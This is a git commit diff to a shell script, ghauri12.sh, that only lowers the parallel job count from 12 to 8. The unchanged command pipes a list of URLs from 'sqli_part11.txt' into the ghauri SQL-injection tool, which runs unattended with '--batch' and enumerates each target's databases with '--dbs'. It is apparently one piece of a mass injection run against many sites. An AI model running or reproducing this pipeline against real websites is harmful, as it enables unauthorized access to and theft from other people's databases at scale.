36d0988a4808d7333409045814359b5dd35e02af
Nishant Bhagat <nishantbhagat57@gmail.com>
2023-12-15 21:53:02 +0530

    Update ghauri12.sh

--- ghauri12.sh
+++ ghauri12.sh
@@ -1,1 +1,1 @@
-cat sqli_part11.txt | rush -k -j 12 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 60 --level 3 --flush-session --fresh-queries --technique BT --batch"'
+cat sqli_part11.txt | rush -k -j 8 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 60 --level 3 --flush-session --fresh-queries --technique BT --batch"'
